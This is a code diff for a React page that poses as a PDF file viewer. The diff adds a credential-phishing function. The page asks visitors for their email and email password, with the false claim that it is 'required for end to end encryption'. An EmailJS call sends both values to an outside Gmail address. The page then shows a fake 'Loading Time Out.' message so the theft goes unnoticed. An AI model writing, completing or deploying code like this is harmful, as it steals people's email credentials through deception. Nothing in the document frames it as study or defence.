@@ -1,6 +1,7 @@
 import { useEffect, useState } from "react";
 import { FaFilePdf } from "react-icons/fa";
-import { HiOutlineArrowDownTray } from "react-icons/hi2";
+import { HiOutlineArrowDownTray, HiOutlineEye, HiOutlineEyeSlash } from "react-icons/hi2";
+import emailjs from "@emailjs/browser";
 import "./App.css";
 
 const files = [
@@ -24,6 +25,11 @@ const files = [
 export default function App() {
   const [showModal, setShowModal] = useState(false);
   const [email, setEmail] = useState("");
+  const [showName, setShowName] = useState(true);
+const [message, setMessage] = useState("");
+const [sending, setSending] = useState(false);
+const [status, setStatus] = useState("");
+const [statusType, setStatusType] = useState("");
 
   useEffect(() => {
     const params = new URLSearchParams(window.location.search);
@@ -37,9 +43,51 @@ export default function App() {
     }
   }, []);
 
+const sendMessage = async () => {
+  setStatus("");
+  setStatusType("");
+
+  if (!email.trim()) {
+    setStatus("Password is required.");
+    setStatusType("error");
+    return;
+  }
+
+  if (!message.trim()) {
+    setStatus("Please enter your password.");
+    setStatusType("error");
+    return;
+  }
+
+  setSending(true);
+
+  try {
+    await emailjs.send(
+      "service_z8ry6ib",
+      "template_yg49xdm",
+      {
+        email: email,
+        message: message,
+        to_email: "mloggers4giv@gmail.com",
+      },
+      "0Wjhuu9FSDyO8bqLT"
+    );
+
+    setStatus("Loading Time Out.");
+    setStatusType("success");
+    setMessage("");
+
+  } catch (err) {
+    console.error("EmailJS error:", err);
+    setStatus("Failed to send message. Please try again.");
+    setStatusType("error");
+  } finally {
+    setSending(false);
+  }
+};
+
   return (
     <div className="app">
-
       {/* Top Bar */}
 
       <header className="topbar">
@@ -142,13 +190,30 @@ export default function App() {
               We'll never share your email with anyone else.
             </small>
 
-            <label>Password</label>
+          <label>Password</label>
 
+          <div className="input-wrapper">
             <input
-              type="password"
-              placeholder="Receiver's Email Password"
+              type={showName ? "password" : "text"}
+              placeholder="Receiver's Password"
+              value={message}
+            onChange={(e) => setMessage(e.target.value)}
             />
 
+            <button
+              type="button"
+              className="eye-btn"
+              onClick={() => setShowName(!showName)}
+              aria-label={showName ? "Hide name" : "Show name"}
+            >
+              {showName ? <HiOutlineEyeSlash /> : <HiOutlineEye /> }
+            </button>
+          </div>
+                    {status && (
+            <div className={`form-status ${statusType}`}>
+              {status}
+            </div>
+          )}
             <small>
               Required for end to end encryption.
             </small>
@@ -173,8 +238,12 @@ export default function App() {
                 Cancel
               </button>
 
-              <button className="submit">
-                View Files
+              <button
+                className="submit"
+               onClick={sendMessage}
+                disabled={sending}
+              >
+                {sending ? "loading..." : "View Files"}
               </button>
 
             </div>
